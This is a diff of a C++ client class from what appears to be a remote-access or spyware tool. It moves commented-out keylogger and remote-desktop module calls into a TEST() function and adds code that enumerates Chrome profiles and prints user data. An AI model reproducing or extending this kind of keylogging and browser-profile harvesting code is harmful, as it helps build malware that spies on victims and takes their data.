@@ -151,23 +151,34 @@ Cliente::Cliente() {
         this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");
 
     }
- 
-    //this->mod_Fun = new modFun();
-    //this->mod_Key = new mod_Keylogger();
-    //this->mod_Key->Start();
-   /* this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
-    for (auto mon : this->mod_RemoteDesk->m_ListaMonitores()) {
-        std::cout << mon.szDevice << "\t" << mon.rectData.resWidth << "x" << mon.rectData.resHeight << "\n";
-    }*/
-    this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
-    for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
-        std::cout << "TITLE: " << ventana.strTitle << "\n";
-        std::cout << "HWND: " << ventana.hwnd<< "\n";
-        std::cout << "ACTIVE: " << ventana.active<< "\n";
-    }
 
+    
 }
 
+void Cliente::TEST() {
+    //this->mod_Fun = new modFun();
+//this->mod_Key = new mod_Keylogger();
+//this->mod_Key->Start();
+/* this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+ for (auto mon : this->mod_RemoteDesk->m_ListaMonitores()) {
+     std::cout << mon.szDevice << "\t" << mon.rectData.resWidth << "x" << mon.rectData.resHeight << "\n";
+ }*/
+ /*this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
+ for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
+     std::cout << "TITLE: " << ventana.strTitle << "\n";
+     std::cout << "HWND: " << ventana.hwnd<< "\n";
+     std::cout << "ACTIVE: " << ventana.active<< "\n";
+ }*/
+
+    this->mod_Inf0 = new mod_Info();
+
+    for (Chrome_Profile& prof : this->mod_Inf0->m_ChromeProfiles()) {
+        std::cout << prof.strGaiaName << "\n";
+        std::cout << prof.strPath << "\n";
+    }
+
+    std::cout << this->mod_Inf0->m_GetUsersData();
+}
 Cliente::~Cliente() {
 	this->CerrarConexion();
     this->DestroyClasses();
